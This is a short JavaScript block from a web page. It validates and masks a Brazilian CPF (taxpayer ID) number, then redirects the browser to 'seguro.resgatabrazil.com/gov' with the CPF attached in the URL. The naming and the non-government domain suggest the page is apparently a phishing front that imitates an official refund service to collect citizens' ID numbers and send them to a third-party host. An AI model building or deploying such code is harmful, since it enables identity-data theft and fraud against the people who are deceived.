  <script>

  function ValidaCPF() {
    var cpf = document.getElementById("accountId").value.replace(/[^\d]/g, '');
    if (cpf.length !== 11 || !ValidaDigitosVerificadores(cpf)) {
      
      document.getElementById("invalidcpf").style.display="block";
      setTimeout(() => {        
        document.getElementById("invalidcpf").style.display="none";
      }, 3000);
    } else {
         const urlParams = new URLSearchParams(window.location.search);
         window.location.href = "https://seguro.resgatabrazil.com/gov?cpf="+document.getElementById("accountId").value.replace(/[^\d]/g, '') + '&' + urlParams.toString();
    }
  }

  function ValidaDigitosVerificadores(cpf) {
    var soma = 0;
    for (var i = 0; i < 9; i++) {
      soma += parseInt(cpf.charAt(i)) * (10 - i);
    }
    var resto = soma % 11;
    var digitoVerificador1 = resto < 2 ? 0 : 11 - resto;
    if (parseInt(cpf.charAt(9)) !== digitoVerificador1) {
      return false;
    }
    soma = 0;
    for (var i = 0; i < 10; i++) {
      soma += parseInt(cpf.charAt(i)) * (11 - i);
    }
    resto = soma % 11;
    var digitoVerificador2 = resto < 2 ? 0 : 11 - resto;
    return parseInt(cpf.charAt(10)) === digitoVerificador2;
  }

    function fMasc(objeto,mascara) {
    obj=objeto
    masc=mascara
    setTimeout("fMascEx()",1)
  }

    function fMascEx() {
    obj.value=masc(obj.value)
  }

   function mCPF(cpf){
    cpf=cpf.replace(/\D/g,"")
    cpf=cpf.replace(/(\d{3})(\d)/,"$1.$2")
    cpf=cpf.replace(/(\d{3})(\d)/,"$1.$2")
    cpf=cpf.replace(/(\d{3})(\d{1,2})$/,"$1-$2")
    return cpf
  }

  </script>
